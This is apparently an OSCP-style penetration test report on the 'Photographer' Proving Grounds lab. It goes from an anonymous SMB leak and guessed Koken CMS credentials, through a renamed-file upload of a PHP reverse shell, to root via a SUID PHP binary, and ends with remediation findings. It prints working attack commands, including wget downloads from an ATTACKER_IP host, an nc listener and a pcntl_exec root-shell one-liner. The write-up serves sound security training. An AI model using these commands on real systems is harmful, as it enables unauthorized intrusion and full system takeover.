# PG Play Photographer - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-15

---

## 0. Lesson Learned

Try all the GTFOBins commands before giving up.

---

## 1. Executive Summary

A penetration test was conducted against the target host “Photographer” in the Offensive Security Proving Grounds Play environment. The assessment identified multiple vulnerabilities including anonymous SMB access, credential disclosure, arbitrary file upload in Koken CMS, and a vulnerable SUID PHP binary.

Initial access was achieved by leveraging information disclosed through an anonymous SMB share to guess valid credentials for the Koken CMS administrative interface. A known arbitrary file upload vulnerability in Koken CMS 0.22.24 was then exploited to gain remote code execution as the `www-data` user.

Privilege escalation to root was achieved by abusing a SUID-enabled PHP binary and leveraging GTFOBins techniques to spawn a privileged shell.

The assessment demonstrated full compromise of the target system.

---

## 2. Scope

- **Target:** 192.168.203.76
- **Environment:** PG Play Photographer
- **Testing Window:** 2026-5-15
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 192.168.203.76 -T4 -oA photographer_tcp --open
```

Relevant Output:

```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache 2.4.18 Ubuntu
139/tcp  open  netbios-ssn Samba 4.3.11
445/tcp  open  microsoft-ds Samba 4.3.11
8000/tcp open  http    Apache 2.4.18 Ubuntu - Koken 0.22.24
```

Interpretation:

The target exposed SSH, SMB, and multiple web services including a Koken CMS instance on TCP port 8000.

---

## 5. Enumeration

### SMB Enumeration

Anonymous SMB enumeration was performed.

Command:

```
smbclient -L //192.168.203.76 -N
```

Relevant Output:

```
Sharename       Type
---------       ----
print$
sambashare
IPC$
```

Anonymous access to the `sambashare` share was permitted.

Command:

```
smbclient //192.168.203.76/sambashare -N
```

Relevant Output:

```
mailsent.txt
wordpress.bkp.zip
```

Interpretation:

The SMB share exposed potentially sensitive files.

### Credential Disclosure

The `mailsent.txt` file disclosed usernames and a password hint.

Command:

```
get mailsent.txt
cat mailsent.txt
```

Relevant Output:

```
agi@photographer.com
daisa@photographer.com
Don't forget your secret, my babygirl ;)
```

Interpretation:

The message disclosed valid usernames and a probable password hint.

### Web Enumeration

The primary website on TCP port 80 hosted a static photographer-themed page. A Koken CMS Website was hosted on TCP port 8000.

Directory and file brute forcing was performed.

Command:

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 http://192.168.203.76:8000/FUZZ
```

Command:

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 http://192.168.203.76:8000/FUZZ/
```

Interpretation:

The Koken CMS administrative interface was identified on TCP port 8000.

URL:

```
http://192.168.203.76:8000/admin/
```

Credentials successfully guessed:

```
daisa@photographer.com : babygirl
```

Interpretation:

Credential guessing based on the SMB-disclosed password hint resulted in valid administrative access to Koken CMS.

---

## 6. Initial Access

### Koken CMS Arbitrary File Upload

Public research identified an arbitrary file upload vulnerability affecting Koken CMS 0.22.24.

A malicious PHP payload was created from PentestMonkey's PHP Reverse Shell.

The payload was saved as:

```
image.php.jpg
```

Interpretation:

The payload was disguised as an image file to bypass upload restrictions.

### Upload Malicious File

The administrative import functionality was abused.

Path:

```
Dashboard -> Import Content
```

Burp Suite interception was enabled during the upload process.

The uploaded filename was modified in transit.

Original:

```
image.php.jpg
```

Modified:

```
image.php
```

Interpretation:

The server-side validation failed to properly sanitize uploaded filenames.

### Remote Code Execution

Initial attempts using a simple command execution shell resulted in HTTP 500 errors.

A PHP reverse shell payload was uploaded instead and executed successfully.

Listener:

```
nc -lvnp 443
```

Relevant Output:

```
connection received
```

Commands:

```
whoami

hostname

ip a
```

Relevant Output:

```
www-data
photographer
```

Interpretation:

Initial access was obtained as the `www-data` user.

### Shell Stabilization

Command:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
```

Interpretation:

The shell was stabilized for interactive post-exploitation activities.

---

## 7. Post-Exploitation

### Sudo Enumeration

Command:

```
sudo -l
```

Relevant Output:

```
[sudo] password for www-data:
```

Interpretation:

The current user did not possess passwordless sudo privileges.

### SUID Enumeration

Commands:

```
find / -perm -u=s -type f -ls 2>/dev/null

find / -perm -g=s -type f -ls 2>/dev/null
```

Interpretation:

Several SUID binaries were identified for further investigation.

### Cron Enumeration

Command:

```
cat /etc/crontab
```

Interpretation:

No immediately exploitable cron jobs were identified.

### Process Monitoring

The `pspy64` utility was uploaded to monitor processes and scheduled tasks.

Commands:

```
wget http://ATTACKER_IP/pspy64

chmod 755 pspy64

./pspy64
```

Interpretation:

No viable privilege escalation vectors were identified through scheduled task execution.

### Network Enumeration

Listening services were enumerated.

Command:

```
netstat -tunlp
```

Relevant Output:

```
127.0.0.1:53
127.0.0.1:631
127.0.0.1:3306
```

Interpretation:

Internal services were present but did not provide an immediate privilege escalation path.

### SUID PHP Binary Discovery

The installed sudo version and system binaries were inspected.

Command:

```
sudo --version
```

The `lse.sh` enumeration script was executed.

Commands:

```
cd /dev/shm

wget http://ATTACKER_IP/lse.sh -O lse.sh

chmod 700 lse.sh

./lse.sh
```

Relevant Output:

```
/usr/bin/php7.2
```

Interpretation:

The PHP binary possessed the SUID bit and could potentially be abused for privilege escalation.

---

## 8. Privilege Escalation

### Abuse SUID PHP Binary

GTFOBins techniques for PHP were reviewed.

A privileged shell was spawned using the SUID-enabled PHP binary.

Command:

```
/usr/bin/php7.2 -r 'pcntl_exec("/bin/sh", ["-p"]);'
```

Commands:

```
whoami

hostname

id
```

Relevant Output:

```
root
photographer
uid=33(www-data) gid=33(www-data) euid=0(root)
```

Interpretation:

The SUID-enabled PHP binary allowed arbitrary command execution with effective UID 0, resulting in root-level access.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/daisa/local.txt
```

**Root Flag**: *REDACTED*

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Anonymous SMB Share Exposing Sensitive Information

**Severity:** High

**Description:**
The SMB service permitted anonymous access to shared files containing sensitive internal information and password hints.

**Impact:**
Attackers could enumerate usernames and recover information useful for credential attacks and unauthorized access.

**Recommendation:**
Disable anonymous SMB access, restrict share permissions, and avoid storing sensitive information in publicly accessible shares.

### **Finding:** Weak Credentials and Password Reuse

**Severity:** High

**Description:**
Application credentials were easily guessable based on disclosed password hints.

**Impact:**
Attackers could gain unauthorized access to administrative interfaces and compromise hosted applications.

**Recommendation:**
Enforce strong password policies, avoid password hints, and implement multi-factor authentication where possible.

### **Finding:** Arbitrary File Upload in Koken CMS

**Severity:** Critical

**Description:**
The Koken CMS application failed to properly validate uploaded files, allowing arbitrary PHP file uploads.

**Impact:**
Attackers could execute arbitrary commands remotely and gain shell access to the underlying operating system.

**Recommendation:**
Restrict executable file uploads, validate file extensions server-side, sanitize uploaded filenames, and update vulnerable CMS software.

### **Finding:** SUID-Enabled PHP Binary Allowing Privilege Escalation

**Severity:** Critical

**Description:**
The PHP interpreter possessed the SUID bit, allowing execution of arbitrary commands with elevated privileges.

**Impact:**
Attackers with local access could escalate privileges to root and fully compromise the system.

**Recommendation:**
Remove unnecessary SUID permissions from binaries, enforce least privilege, and regularly audit privileged executables.

---

## 11. Appendix

Koken CMS 0.22.24 Arbitrary File Upload -
[https://www.exploit-db.com/exploits/48706](https://www.exploit-db.com/exploits/48706)

GTFOBins PHP SUID Privilege Escalation -
[https://gtfobins.org/gtfobins/php/](https://gtfobins.org/gtfobins/php/)